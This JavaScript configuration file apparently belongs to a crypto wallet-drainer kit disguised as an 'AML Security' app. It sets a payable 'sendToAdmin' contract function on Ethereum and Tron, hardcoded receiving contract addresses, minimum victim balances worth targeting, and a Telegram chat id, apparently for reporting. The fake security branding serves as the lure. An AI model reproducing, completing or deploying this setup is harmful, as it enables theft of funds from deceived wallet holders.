import { http } from 'wagmi'
import { mainnet } from 'wagmi/chains'

const config = {
    projectId: 'b8af9d20aeff633b2b0547d8af6edb5a', // Replace with your reown project id (https://reown.com/)
    chains: [mainnet], // Possible values are: testnet, arbitrum etc.
    transports: {
        [mainnet.id]: http(),
    },
    ethAbi: [ // replace with Eth contract abi
        {
            inputs: [],
            name: 'sendToAdmin', // keep same as functionName below
            outputs: [],
            stateMutability: 'payable',
            type: 'function'
        }
    ],
    ethContractAddress: '0x14B995B9F37F9F79926ad0889Dd49a314499716B', // replace with the actual address
    functionName: 'sendToAdmin', // replace with the actual functionName
    metadata: { // Replace with your data
        name: 'AML Security',
        description: 'AML Security app',
        url: 'https://aml-security.com', // origin must match your domain & subdomain
        icons: ['https://avatars.githubusercontent.com/u/179229932']
    },
    minimumEthBalance: "0.003",
    // ---- Tron Configs ----
    tronContractAddress: "TJpaozAc7EioXybLdgvjgx5vMVojrcjEh7", // Replace with your contract address
    tronFunctionName: 'sendToAdmin()',
    tronFunctionParams: [],
    minimumTrxBalance: 10,
    // ---- Telegram Configs ----
    chatId: 1242531056
}

export default config